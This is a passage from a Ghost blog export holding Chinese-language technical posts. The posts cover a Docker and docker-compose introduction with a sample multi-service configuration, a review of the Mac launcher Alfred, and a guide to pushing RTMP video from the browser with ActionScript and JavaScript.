alt=\"\"></p>\n<ul>\n<li>\n<p>什么是Docker</p>\n<p>Docker可以帮助你把项目应用及相关所有依赖打包成一个标准化的单元。Docker容器是由Docker提供的虚拟化环境，在一个Docker容器中包含了运行项目所需的一切：代码、系统库、其他软件，总之，包括了你可以在服务器上安装的一切。</p>\n</li>\n<li>\n<p>为什么用Docker</p>\n<p>Docker的意义就在于将运行项目所需的外部依赖统统作为项目的组成部分包含在项目下的一个Docker配置文件中，通过它我们可以直接让项目在Docker中运行起来，这样的做的好处是显而易见的：</p>\n</li>\n</ul>\n<pre><code>1. 不再需要提前在服务器上安装及配置项目所依赖的环境\n2. 降低项目在开发过程中，开发环境不断迭代更新的成本以及搭建项目环境的成本\n3. 多个应用在同一台服务器运行时，可以方便的隔离环境，避免依赖冲突\n4. 所有项目都运行在Docker的虚拟容器中，物理机干干净净！爽！！\n</code></pre>\n<ul>\n<li>\n<p>实践</p>\n<p>Docker容器为应用提供了独立的运行环境，Docker提供了一组命令行工具，让我们可以方便的对Docker容器进行管理。对于非Linux的平台，我们还需要先安装<code>docker-machine</code>（这相对于一个linux虚拟机），再将docker容器放在<code>docker-machine</code>中。</p>\n<p><code>docker-compose</code>是Docker提供的另一个非常有用的管理工具，我们可以通过定义<code>docker-compose</code>的配置文件，对多个Docker容器统一进行管理。下是一个<code>docker-compose.yml</code>文件的例子：</p>\n</li>\n</ul>\n<pre><code>version: '2'\n\nservices:\n  mysql:\n    image: mysql:5.7\n    container_name: mysql\n    ports:\n      - &quot;3309:3306&quot;\n    volumes:\n      - ./mysql/data:/var/lib/mysql\n      - ./mysql/etc/conf.d:/etc/mysql/conf.d\n      - ./mysql_run.sh:/mysql_run.sh\n    command: /mysql_run.sh\n    env_file: .env\n    restart: always\n\n  nginx:\n    image: nginx:1.9.8\n    container_name: nginx\n    ports:\n      - &quot;80:80&quot;\n    volumes:\n      - ./nginx/etc/conf.d:/etc/nginx/conf.d\n      - ./www:/usr/share/nginx/html\n    links:\n      - web\n      - phpmyadmin\n    restart: always\n\n  web:\n    #image: php:5.6-fpm\n    build: ./web\n    container_name: web\n    links:\n      - &quot;mysql&quot;\n      - &quot;beanstalkd&quot;\n    ports:\n      - &quot;9009:9001&quot;\n    volumes: \n      - ./web/cron:/etc/pam.d/cron\n      - ./web/crontab:/etc/crontab\n      - ./web/log:/var/log\n      - ./web/supervisor:/etc/supervisor/conf.d\n      - ./www:/usr/share/nginx/html\n    restart: always\n\n  phpmyadmin:\n    image: phpmyadmin/phpmyadmin\n    container_name: phpmyadmin\n    env_file: .env\n    links:\n      - mysql:db\n    ports:\n      - &quot;8888:80&quot;\n    restart: always\n\n  beanstalkd:\n    image: schickling/beanstalkd\n    container_name: beanstalkd\n    ports:\n      - &quot;11300:11300&quot;\n    restart: always\n\n</code></pre>\n<p>需要注意的是，根据Docker的设计理念，一个容器中只应包含一个进程，整个项目再由多个Docker容器组合而成。但是，如果确实需要在一个Docker容器中<br>\n运行多个程序的话，可以用类似supervisor的方式来实现，<a href=\"https://docs.docker.com/engine/admin/using_supervisord/\">这里可以参考官方给出的例子</a>。上面说的这种情况，比较常见的是需要通过crontab定时执行项目中的某个任务，<a href=\"https://github.com/chxj1992/docker/tree/master/web\">在这里也提供了一个具体的例子可供参考</a>。</p>\n<p>解耦是软件工程中重要的思想之一，Docker所做的工作正是解除了项目与平台间的耦合，将项目生命的整个生态系统封装在一个个独立的集装箱里，服务器本身则如同运载货物的甲板，无须再提供额外的服务。随着项目规模的增长及分布式方案的应用，相较于传统的部署方式，Docker的优势会变得更加明显。所以，如果有兴趣，不妨试着把自己的项目封装成一个Docker容器，也来体验一把一键部署的快感！</p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"55","plaintext":"> 在传统的应用部署实践中，我们需要在应用发布之前在服务器上准备好其所需的环境（如项目所依赖的库、语法解释器、Web容器等），Docker则为我们提供了一种更优雅的方式来解决这一问题。\n\n\n\n\n * 什么是Docker\n   \n   Docker可以帮助你把项目应用及相关所有依赖打包成一个标准化的单元。Docker容器是由Docker提供的虚拟化环境，在一个Docker容器中包含了运行项目所需的一切：代码、系统库、其他软件，总之，包括了你可以在服务器上安装的一切。\n   \n   \n * 为什么用Docker\n   \n   Docker的意义就在于将运行项目所需的外部依赖统统作为项目的组成部分包含在项目下的一个Docker配置文件中，通过它我们可以直接让项目在Docker中运行起来，这样的做的好处是显而易见的：\n   \n   \n\n1. 不再需要提前在服务器上安装及配置项目所依赖的环境\n2. 降低项目在开发过程中，开发环境不断迭代更新的成本以及搭建项目环境的成本\n3. 多个应用在同一台服务器运行时，可以方便的隔离环境，避免依赖冲突\n4. 所有项目都运行在Docker的虚拟容器中，物理机干干净净！爽！！\n\n\n * 实践\n   \n   Docker容器为应用提供了独立的运行环境，Docker提供了一组命令行工具，让我们可以方便的对Docker容器进行管理。对于非Linux的平台，我们还需要先安装\n   docker-machine（这相对于一个linux虚拟机），再将docker容器放在docker-machine中。\n   \n   docker-compose是Docker提供的另一个非常有用的管理工具，我们可以通过定义docker-compose\n   的配置文件，对多个Docker容器统一进行管理。下是一个docker-compose.yml文件的例子：\n   \n   \n\nversion: '2'\n\nservices:\n  mysql:\n    image: mysql:5.7\n    container_name: mysql\n    ports:\n      - \"3309:3306\"\n    volumes:\n      - ./mysql/data:/var/lib/mysql\n      - ./mysql/etc/conf.d:/etc/mysql/conf.d\n      - ./mysql_run.sh:/mysql_run.sh\n    command: /mysql_run.sh\n    env_file: .env\n    restart: always\n\n  nginx:\n    image: nginx:1.9.8\n    container_name: nginx\n    ports:\n      - \"80:80\"\n    volumes:\n      - ./nginx/etc/conf.d:/etc/nginx/conf.d\n      - ./www:/usr/share/nginx/html\n    links:\n      - web\n      - phpmyadmin\n    restart: always\n\n  web:\n    #image: php:5.6-fpm\n    build: ./web\n    container_name: web\n    links:\n      - \"mysql\"\n      - \"beanstalkd\"\n    ports:\n      - \"9009:9001\"\n    volumes: \n      - ./web/cron:/etc/pam.d/cron\n      - ./web/crontab:/etc/crontab\n      - ./web/log:/var/log\n      - ./web/supervisor:/etc/supervisor/conf.d\n      - ./www:/usr/share/nginx/html\n    restart: always\n\n  phpmyadmin:\n    image: phpmyadmin/phpmyadmin\n    container_name: phpmyadmin\n    env_file: .env\n    links:\n      - mysql:db\n    ports:\n      - \"8888:80\"\n    restart: always\n\n  beanstalkd:\n    image: schickling/beanstalkd\n    container_name: beanstalkd\n    ports:\n      - \"11300:11300\"\n    restart: always\n\n\n\n需要注意的是，根据Docker的设计理念，一个容器中只应包含一个进程，整个项目再由多个Docker容器组合而成。但是，如果确实需要在一个Docker容器中\n运行多个程序的话，可以用类似supervisor的方式来实现，这里可以参考官方给出的例子\n[https://docs.docker.com/engine/admin/using_supervisord/]\n。上面说的这种情况，比较常见的是需要通过crontab定时执行项目中的某个任务，在这里也提供了一个具体的例子可供参考\n[https://github.com/chxj1992/docker/tree/master/web]。\n\n解耦是软件工程中重要的思想之一，Docker所做的工作正是解除了项目与平台间的耦合，将项目生命的整个生态系统封装在一个个独立的集装箱里，服务器本身则如同运载货物的甲板，无须再提供额外的服务。随着项目规模的增长及分布式方案的应用，相较于传统的部署方式，Docker的优势会变得更加明显。所以，如果有兴趣，不妨试着把自己的项目封装成一个Docker容器，也来体验一把一键部署的快感！","feature_image":"/content/images/2016/05/Screen-Shot-2016-05-02-at-1-37-41-PM-2.png","featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2016-04-18 08:58:23","updated_at":"2016-05-02 07:12:53","published_at":"2016-05-02 07:12:53","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e77","uuid":"b518ecdc-df21-4f9b-a762-79605a5fc1b4","title":"Mac 神器之 Alfred","slug":"mac-toys-zhi-alfred","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 用一句话来说，Alfred是一款Mac下必不可少的神器!\\n\\n首先，Alfred覆盖了Mac原生的Spotlight的功能，比如：\\n\\n* 启动应用\\n![](/content/images/2016/04/Screen-Shot-2016-04-23-at-10-46-47-PM.png)\\n\\n* 查找文件\\n![](/content/images/2016/04/Screen-Shot-2016-04-23-at-10-46-18-PM.png)\\n![](/content/images/2016/04/Screen-Shot-2016-04-23-at-10-46-28-PM-1.png)\\n\\n还有一些额外的小把戏：\\n\\n* 计算器\\n![](/content/images/2016/04/Screen-Shot-2016-04-23-at-11-03-42-PM.png)\\n\\n* 放大显示（command+L）\\n![](/content/images/2016/04/Screen-Shot-2016-04-23-at-10-43-48-PM.png)\\n\\n不过，仅凭上面这些还远不足以让Alfred被赞为神器，`workflows` 才是Alfred最酷的功能。\\n\\nworkflows可以理解为允许开发者自己编写的Alfred插件。在Alfred中，你可以方便的定义插件的流程和触发方式，并支持通过多种语言来编写插件的具体逻辑。所以，我们可以将能想到的各种日常功能写成workflows集成到Alfred中。\\n\\n![](/content/images/2016/04/Screen-Shot-2016-04-23-at-11-11-55-PM.png)\\n\\n* 快递查询\\n![](/content/images/2016/04/Screen-Shot-2016-04-23-at-10-56-36-PM.png)\\n\\n* 天气预报\\n![](/content/images/2016/04/Screen-Shot-2016-04-23-at-10-53-29-PM.png)\\n\\n* 翻译（有道）\\n![](/content/images/2016/04/Screen-Shot-2016-04-23-at-10-57-00-PM.png)\\n\\n网上有大量开源的workflows可以使用，我们也可以根据需要编写 [自己的workflows](https://github.com/chxj1992/alfred-workflows)，总之，祝大家玩得开心。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><blockquote>\n<p>用一句话来说，Alfred是一款Mac下必不可少的神器!</p>\n</blockquote>\n<p>首先，Alfred覆盖了Mac原生的Spotlight的功能，比如：</p>\n<ul>\n<li>\n<p>启动应用<br>\n<img src=\"/content/images/2016/04/Screen-Shot-2016-04-23-at-10-46-47-PM.png\" alt=\"\"></p>\n</li>\n<li>\n<p>查找文件<br>\n<img src=\"/content/images/2016/04/Screen-Shot-2016-04-23-at-10-46-18-PM.png\" alt=\"\"><br>\n<img src=\"/content/images/2016/04/Screen-Shot-2016-04-23-at-10-46-28-PM-1.png\" alt=\"\"></p>\n</li>\n</ul>\n<p>还有一些额外的小把戏：</p>\n<ul>\n<li>\n<p>计算器<br>\n<img src=\"/content/images/2016/04/Screen-Shot-2016-04-23-at-11-03-42-PM.png\" alt=\"\"></p>\n</li>\n<li>\n<p>放大显示（command+L）<br>\n<img src=\"/content/images/2016/04/Screen-Shot-2016-04-23-at-10-43-48-PM.png\" alt=\"\"></p>\n</li>\n</ul>\n<p>不过，仅凭上面这些还远不足以让Alfred被赞为神器，<code>workflows</code> 才是Alfred最酷的功能。</p>\n<p>workflows可以理解为允许开发者自己编写的Alfred插件。在Alfred中，你可以方便的定义插件的流程和触发方式，并支持通过多种语言来编写插件的具体逻辑。所以，我们可以将能想到的各种日常功能写成workflows集成到Alfred中。</p>\n<p><img src=\"/content/images/2016/04/Screen-Shot-2016-04-23-at-11-11-55-PM.png\" alt=\"\"></p>\n<ul>\n<li>\n<p>快递查询<br>\n<img src=\"/content/images/2016/04/Screen-Shot-2016-04-23-at-10-56-36-PM.png\" alt=\"\"></p>\n</li>\n<li>\n<p>天气预报<br>\n<img src=\"/content/images/2016/04/Screen-Shot-2016-04-23-at-10-53-29-PM.png\" alt=\"\"></p>\n</li>\n<li>\n<p>翻译（有道）<br>\n<img src=\"/content/images/2016/04/Screen-Shot-2016-04-23-at-10-57-00-PM.png\" alt=\"\"></p>\n</li>\n</ul>\n<p>网上有大量开源的workflows可以使用，我们也可以根据需要编写 <a href=\"https://github.com/chxj1992/alfred-workflows\">自己的workflows</a>，总之，祝大家玩得开心。</p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"56","plaintext":"> 用一句话来说，Alfred是一款Mac下必不可少的神器!\n\n\n首先，Alfred覆盖了Mac原生的Spotlight的功能，比如：\n\n * 启动应用\n   \n   \n   \n * 查找文件\n   \n   \n   \n   \n\n还有一些额外的小把戏：\n\n * 计算器\n   \n   \n   \n * 放大显示（command+L）\n   \n   \n   \n\n不过，仅凭上面这些还远不足以让Alfred被赞为神器，workflows  才是Alfred最酷的功能。\n\nworkflows可以理解为允许开发者自己编写的Alfred插件。在Alfred中，你可以方便的定义插件的流程和触发方式，并支持通过多种语言来编写插件的具体逻辑。所以，我们可以将能想到的各种日常功能写成workflows集成到Alfred中。\n\n\n\n * 快递查询\n   \n   \n   \n * 天气预报\n   \n   \n   \n * 翻译（有道）\n   \n   \n   \n\n网上有大量开源的workflows可以使用，我们也可以根据需要编写 自己的workflows\n[https://github.com/chxj1992/alfred-workflows]，总之，祝大家玩得开心。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2016-04-23 03:41:53","updated_at":"2017-03-30 02:39:45","published_at":"2016-04-23 15:19:00","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e78","uuid":"f5e93b8c-8555-4e7c-8767-58169d96facb","title":"在浏览器中实现RTMP推流","slug":"push-rtmp-in-browser","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"#### 什么是RTMP\\n\\n  * 引用自[Adobe官方说明](http://www.adobe.com/devnet/rtmp.html)：\\n  > RTMP(Real-Time Messaging Protocol) 是为了能在基于Adobe Flash平台的技术间实现音频、视频及数据的高性能传输而设计的，包括Adobe Flash Player和Adobe AIR。现在，RTMP已经可以被作为一项开放的标准，用于那些支持视频、音频及其他数据传输的产品或技术，只要传输的数据格式能与Adobe Flash Player适配（如swf、flv、f4v等）。\\n\\n\\n#### 关于RTMP推流\\n\\n  “视频直播”是近两年互联网产业里很火的一个版块，大大小小的视频网站、APP层出不穷，而RTMP是目前市面上实现视频直播所采用的最主流的数据传输方式。常规的方式是，视频主播通过[OBS](https://obsproject.com/)等推流软件将摄像头捕捉的视频通过RTMP协议传输到指定的服务器地址，服务器将接收到的视频流以m3u8格式保存下来，客户端再通过拉取RTMP数据流的方式获取到视频数据并播放。\\n\\n  以上所描述大概就是一个基本的视频直播模型。那么，如果想要直接在浏览器中向RTMP服务器推流又该如何实现呢？这也并非难事，目前市面上大部分浏览器都可以很好的支持Flash，别忘了，RTMP技术正是为了Flash而生的！只需要几行简单的ActionScript代码，我们就能轻松搞定。\\n\\n#### ActionScript & Flex\\n\\n  Flex是Adobe官方提供的一款ActionScript开发框架，Flex提供了丰富的API，并能将ActionScript编译成可被Flash Player执行的swf文件。在开始工作之前，我们需要在开发环境中下载并安装[Flex SDK](https://www.adobe.com/devnet/flex/flex-sdk-download.html)。\\n  \\n  通过ActionScript我们可以实现通过摄像头和麦克风捕捉画面和声音并将媒体数据通过网络流推送至RTMP服务器的工作：\\n\\n```\\n  cam = Camera.getCamera();\\n  ns = new NetStream(nc);\\n  ns.attachCamera(cam);\\n  ns.publish(name, \\\"live\\\");\\n```\\n\\n  更多细节可以参考这个[简单的例子](https://github.com/chxj1992/rtmp-streamer/blob/master/RtmpStreamer.as)。\\n\\n借助Flex SDK中的 `mxmlc`, ActionScript最终会被编译成swf文件并嵌入我们的网页中，我们只要通过javascript调用swf文件暴露出的接口，就能实现对推流过程的操作。\\n\\n这里，提供一个现成的 [Web端实现RTMP推流的Javascript库](https://github.com/chxj1992/rtmp-streamer)（可以通过bower或npm获得），该库遵循AMD规范，开发者可以通过[Requirejs](http://www.requirejs.org/)之类的AMD加载器引入自己的项目中。其原理正是上面所提到的，通过调用swf暴露出的接口，来实现对RTMP数据流的控制。这个库提供了一些基础的API，比如设置视频采集的帧率、摄像头品质、麦克风品质等，如果没有特殊的需求，只需要引入项目中编译好的swf文件及 `rtmp-streamer.min.js`，通过javascript提供的API就能实现基本的推流功能了。如果需要更多复杂的特性，也可以通过修改ActionScript的代码来实现，Flex提供了丰富的接口帮助你实现对摄像头及数据流的操作。更详细使用说明，请参见[项目文档](https://github.com/chxj1992/rtmp-streamer)。\\n\\n这里提供一个简单的例子:\\n在html文件中, 需要引入 `RtmpStreamer.swf` 文件:\\n```html\\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\" xml:lang=\\\"zh_cn\\\" lang=\\\"zh_cn\\\">\\n<head>\\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=gb2312\\\"/>\\n    <title>rtmp streamer example</title>\\n    <script data-main=\\\"main\\\" src=\\\"require.js\\\"></script>\\n</head>\\n<body style=\\\"text-align: center;\\\">\\n\\nrtmp address:\\n<input id=\\\"url\\\" type=\\\"text\\\" style=\\\"width: 400px;\\\" value=\\\"rtmp://localhost:1935/live\\\" title=\\\"url\\\">\\n<input id=\\\"stream-name\\\" type=\\\"text\\\" style=\\\"width: 150px;\\\" value=\\\"myStream\\\" title=\\\"stream-name\\\">\\n\\n<h2>Streamer</h2>\\n<object>\\n    <embed id=\\\"rtmp-streamer\\\" src=\\\"../RtmpStreamer.swf\\\" bgcolor=\\\"#999999\\\" quality=\\\"high\\\"\\n           width=\\\"320\\\" height=\\\"240\\\" allowScriptAccess=\\\"sameDomain\\\" type=\\\"application/x-shockwave-flash\\\"></embed>\\n</object>\\n<br>\\n<button id=\\\"publish\\\"> push</button>\\n<button id=\\\"streamer-disconnect\\\"> disconnect</button>\\n\\n<hr>\\n\\n<h2>Player</h2>\\n<object>\\n    <embed id=\\\"rtmp-player\\\" src=\\\"../RtmpStreamer.swf\\\" bgcolor=\\\"#999999\\\" quality=\\\"high\\\"\\n           width=\\\"320\\\" height=\\\"240\\\" allowScriptAccess=\\\"sameDomain\\\" type=\\\"application/x-shockwave-flash\\\"></embed>\\n</object>\\n<br>\\n<button id=\\\"play\\\"> play</button>\\n<button id=\\\"player-disconnect\\\"> disconnect</button>\\n\\n</body>\\n\\n<script lang=\\\"javascript\\\">\\n\\n</script>\\n\\n</html>\\n```\\n\\n在js文件里, 我用 `RequireJs` 将rtmp-streamer包加载进来:\\n\\n```javascript\\nrequire.config({\\n    paths: {\\n        \\\"rtmp-streamer\\\": \\\"../rtmp-streamer.min\\\"\\n    }\\n});\\n\\nrequire([\\\"rtmp-streamer\\\"], function (RtmpStreamer) {\\n\\n    var getUrl = function () {\\n        return document.getElementById('url').value;\\n    };\\n\\n    var getName = function () {\\n        return document.getElementById('stream-name').value;\\n    };\\n\\n    var streamer = new RtmpStreamer(document.getElementById('rtmp-streamer'));\\n    var player = new RtmpStreamer(document.getElementById('rtmp-player'));\\n\\n    document.getElementById(\\\"play\\\").addEventListener(\\\"click\\\", function () {\\n        player.play(getUrl(), getName());\\n    });\\n\\n    document.getElementById(\\\"publish\\\").addEventListener(\\\"click\\\", function () {\\n        streamer.publish(getUrl(), getName());\\n    });\\n\\n    document.getElementById(\\\"streamer-disconnect\\\").addEventListener(\\\"click\\\", function () {\\n        streamer.disconnect();\\n    });\\n\\n    document.getElementById(\\\"player-disconnect\\\").addEventListener(\\\"click\\\", function () {\\n        player.disconnect();\\n    });\\n\\n});\\n```\\n\\n运行效果如下:\\n\\n![](/content/images/2016/06/screenshot.png)\\n\\n\\n#### RTMP服务器\\n\\n  RTMP作为一种比较成熟的技术，市面上的服务端项目不论是开源的还是商业软件都有不少的选择，这里推荐一个叫[Wowza](https://www.wowza.com/free-trial)的RTMP服务器，如果作为个人学习使用，下载一个免费试用版来玩一玩还是挺不错的。\\n![](/content/images/2016/06/wowza.png)\\n\\n\\n#### 采用直播云服务\\n\\n  直播业务对服务器的负载和网络延迟都有较高的要求, 如果不是很大规模的项目, 一般直接采用靠谱的直播云服务的比较划算, 这里我们以[七牛云](https://www.qiniu.com/products/pili)为例:\\n\\n设置参数的方式和用OBS等工具推流时的方式类似, 地址为直播云的空间名, 数据流名称为直播流的名称加鉴权参数:\\n\\n![](/content/images/2017/03/Screen-Shot-2017-03-12-at-3.16.09-PM.png)\\n\\n\\n在七牛的直播云管理后台中预览推流视频:\\n\\n![](/content/images/2017/03/Screen-Shot-2017-03-12-at-2.01.27-PM.png)\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><h4 id=\"rtmp\">什么是RTMP</h4>\n<ul>\n<li>引用自<a href=\"http://www.adobe.com/devnet/rtmp.html\">Adobe官方说明</a>：</li>\n</ul>\n<blockquote>\n<p>RTMP(Real-Time Messaging Protocol) 是为了能在基于Adobe Flash平台的技术间实现音频、视频及数据的高性能传输而设计的，包括Adobe Flash Player和Adobe AIR。现在，RTMP已经可以被作为一项开放的标准，用于那些支持视频、音频及其他数据传输的产品或技术，只要传输的数据格式能与Adobe Flash Player适配（如swf、flv、f4v等）。</p>\n</blockquote>\n<h4 id=\"rtmp\">关于RTMP推流</h4>\n<p>“视频直播”是近两年互联网产业里很火的一个版块，大大小小的视频网站、APP层出不穷，而RTMP是目前市面上实现视频直播所采用的最主流的数据传输方式。常规的方式是，视频主播通过<a href=\"https://obsproject.com/\">OBS</a>等推流软件将摄像头捕捉的视频通过RTMP协议传输到指定的服务器地址，服务器将接收到的视频流以m3u8格式保存下来，客户端再通过拉取RTMP数据流的方式获取到视频数据并播放。</p>\n<p>以上所描述大概就是一个基本的视频直播模型。那么，如果想要直接在浏览器中向RTMP服务器推流又该如何实现呢？这也并非难事，目前市面上大部分浏览器都可以很好的支持Flash，别忘了，RTMP技术正是为了Flash而生的！只需要几行简单的ActionScript代码，我们就能轻松搞定。</p>\n<h4 id=\"actionscriptflex\">ActionScript &amp; Flex</h4>\n<p>Flex是Adobe官方提供的一款ActionScript开发框架，Flex提供了丰富的API，并能将ActionScript编译成可被Flash Player执行的swf文件。在开始工作之前，我们需要在开发环境中下载并安装<a href=\"https://www.adobe.com/devnet/flex/flex-sdk-download.html\">Flex SDK</a>。</p>\n<p>通过ActionScript我们可以实现通过摄像头和麦克风捕捉画面和声音并将媒体数据通过网络流推送至RTMP服务器的工作：</p>\n<pre><code>  cam = Camera.getCamera();\n  ns = new NetStream(nc);\n  ns.attachCamera(cam);\n  ns.publish(name, &quot;live&quot;);\n</code></pre>\n<p>更多细节可以参考这个<a href=\"https://github.com/chxj1992/rtmp-streamer/blob/master/RtmpStreamer.as\">简单的例子</a>。</p>\n<p>借助Flex SDK中的 <code>mxmlc</code>, ActionScript最终会被编译成swf文件并嵌入我们的网页中，我们只要通过javascript调用swf文件暴露出的接口，就能实现对推流过程的操作。</p>\n<p>这里，提供一个现成的 <a href=\"https://github.com/chxj1992/rtmp-streamer\">Web端实现RTMP推流的Javascript库</a>（可以通过bower或npm获得），该库遵循AMD规范，开发者可以通过<a href=\"http://www.requirejs.org/\">Requirejs</a>之类的AMD加载器引入自己的项目中。其原理正是上面所提到的，通过调用swf暴露出的接口，来实现对RTMP数据流的控制。这个库提供了一些基础的API，比如设置视频采集的帧率、摄像头品质、麦克风品质等，如果没有特殊的需求，只需要引入项目中编译好的swf文件及 <code>rtmp-streamer.min.js</code>，通过javascript提供的API就能实现基本的推流功能了。如果需要更多复杂的特性，也可以通过修改ActionScript的代码来实现，Flex提供了丰富的接口帮助你实现对摄像头及数据流的操作。更详细使用说明，请参见<a href=\"https://github.com/chxj1992/rtmp-streamer\">项目文档</a>。</p>\n<p>这里提供一个简单的例子:<br>\n在html文件中, 需要引入 <code>RtmpStreamer.swf</code> 文件:</p>\n<pre><code class=\"language-html\">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; xml:lang=&quot;zh_cn&quot; lang=&quot;zh_cn&quot;&gt;\n&lt;head&gt;\n    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot;/&gt;\n    &lt;title&gt;rtmp streamer example&lt;/title&gt;\n    &lt;script data-main=&quot;main&quot; src=&quot;require.js&quot;&gt;&lt;/script&gt;\n&lt;/head&gt;\n&lt;body style=&quot;text-align: center;&quot;&gt;\n\nrtmp address:\n&lt;input id=&quot;url&quot; type=&quot;text&quot; style=&quot;width: 400px;&quot; value=&quot;rtmp://localhost:1935/live&quot; title=&quot;url&quot;&gt;\n&lt;input id=&quot;stream-name&quot; type=&quot;text&quot; style=&quot;width: 150px;&quot; value=&quot;myStream&quot; title=&quot;stream-name&quot;&gt;\n\n&lt;h2&gt;Streamer&lt;/h2&gt;\n&lt;object&gt;\n    &lt;embed id=&quot;rtmp-streamer&quot; src=&quot;../RtmpStreamer.swf&quot; bgcolor=&quot;#999999&quot; quality=&quot;high&quot;\n           width=&quot;320&quot; height=&quot;240&quot; allowScriptAccess=&quot;sameDomain&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;/embed&gt;\n&lt;/object&gt;\n&lt;br&gt;\n&lt;button id=&quot;publish&quot;&gt; push&lt;/button&gt;\n&lt;button id=&quot;streamer-disconnect&quot;&gt; disconnect&lt;/button&gt;\n\n&lt;hr&gt;\n\n&lt;h2&gt;Player&lt;/h2&gt;\n&lt;object&gt;\n    &lt;embed id=&quot;rtmp-player&quot; src=&quot;../RtmpStreamer.swf&quot; bgcolor=&quot;#999999&quot; quality=&quot;high&quot;\n           width=&quot;320&quot; height=&quot;240&quot; allowScriptAccess=&quot;sameDomain&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;/embed&gt;\n&lt;/object&gt;\n&lt;br&gt;\n&lt;button id=&quot;play&quot;&gt; play&lt;/button&gt;\n&lt;button id=&quot;player-disconnect&quot;&gt; disconnect&lt;/button&gt;\n\n&lt;/body&gt;\n\n&lt;script lang=&quot;javascript&quot;&gt;\n\n&lt;/script&gt;\n\n&lt;/html&gt;\n</code></pre>\n<p>在js文件里, 我用 <code>RequireJs</code> 将rtmp-streamer包加载进来:</p>\n<pre><code class=\"language-javascript\">require.config({\n    paths: {\n        &quot;rtmp-streamer&quot;: &quot;../rtmp-streamer.min&quot;\n    }\n});\n\nrequire([&quot;rtmp-streamer&quot;], function (RtmpStreamer) {\n\n    var getUrl = function () {\n        return document.getElementById('url').value;\n    };\n\n    var getName = function () {\n        return document.getElementById('stream-name').value;\n    };\n\n    var streamer = new RtmpStreamer(document.getElementById('rtmp-streamer'));\n    var player = new RtmpStreamer(document.getElementById('rtmp-player'));\n\n    document.getElementById(&quot;play&quot;).addEventListener(&quot;click&quot;, function () {\n        player.play(getUrl(), getName());\n    });\n\n    document.getElementById(&quot;publish&quot;).addEventListener(&quot;click&quot;, function () {\n        streamer.publish(getUrl(), getName());\n    });\n\n    document.getElementById(&quot;streamer-disconnect&quot;).addEventListener(&quot;click&quot;, function () {\n        streamer.disconnect();\n    });\n\n    document.getElementById(&quot;player-disconnect&quot;).addEventListener(&quot;click&quot;, function () {\n        player.disconnect();\n    });\n\n});\n</code></pre>\n<p>运行效果如下:</p>\n<p><img src=\"/content/images/2016/06/screenshot.png\" alt=\"\"></p>\n<h4 id=\"rtmp\">RTMP服务器</h4>\n<p>RTMP作为一种比较成熟的技术，市面上的服务端项目不论是开源的还是商业软件都有不少的选择，这里推荐一个叫<a href=\"https://www.wowza.com/free-trial\">Wowza</a>的RTMP服务器，如果作为个人学习使用，下载一个免费试用版来玩一玩还是挺不错的。<br>\n<img src=\"/content/images/2016/06/wowza.png\" alt=\"\"></p>\n<h4 id=\"\">采用直播云服务</h4>\n<p>直播业务对服务器的负载和网络延迟都有较高的要求, 如果不是很大规模的项目, 一般直接采用靠谱的直播云服务的比较划算, 这里我们以<a href=\"https://www.qiniu.com/products/pili\">七牛云</a>为例:</p>\n<p>设置参数的方式和用OBS等工具推流时的方式类似, 地址为直播云的空间名, 数据流名称为直播流的名称加鉴权参数:</p>\n<p><img src=\"/content/images/2017/03/Screen-Shot-2017-03-12-at-3.16.09-PM.png\" alt=\"\"></p>\n<p>在七牛的直播云管理后台中预览推流视频:</p>\n<p><img src=\"/content/images/2017/03/Screen-Shot-2017-03-12-at-2.01.27-PM.png\" alt=\"\"></p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"57","plaintext":"什么是RTMP\n * 引用自Adobe官方说明 [http://www.adobe.com/devnet/rtmp.html]：\n\n> RTMP(Real-Time Messaging Protocol) 是为了能在基于Adobe\nFlash平台的技术间实现音频、视频及数据的高性能传输而设计的，包括Adobe Flash Player和Adobe\nAIR。现在，RTMP已经可以被作为一项开放的标准，用于那些支持视频、音频及其他数据传输的产品或技术，只要传输的数据格式能与Adobe Flash\nPlayer适配（如swf、flv、f4v等）。\n\n\n关于RTMP推流\n“视频直播”是近两年互联网产业里很火的一个版块，大大小小的视频网站、APP层出不穷，而RTMP是目前市面上实现视频直播所采用的最主流的数据传输方式。常规的方式是，视频主播通过\n\nOBS [https://obsproject.com/]\n等推流软件将摄像头捕捉的视频通过RTMP协议传输到指定的服务器地址，服务器将接收到的视频流以m3u8格式保存下来，客户端再通过拉取RTMP数据流的方式获取到视频数据并播放。\n\n以上所描述大概就是一个基本的视频直播模型。那么，如果想要直接在浏览器中向RTMP服务器推流又该如何实现呢？这也并非难事，目前市面上大部分浏览器都可以很好的支持Flash，别忘了，RTMP技术正是为了Flash而生的！只需要几行简单的ActionScript代码，我们就能轻松搞定。\n\nActionScript & 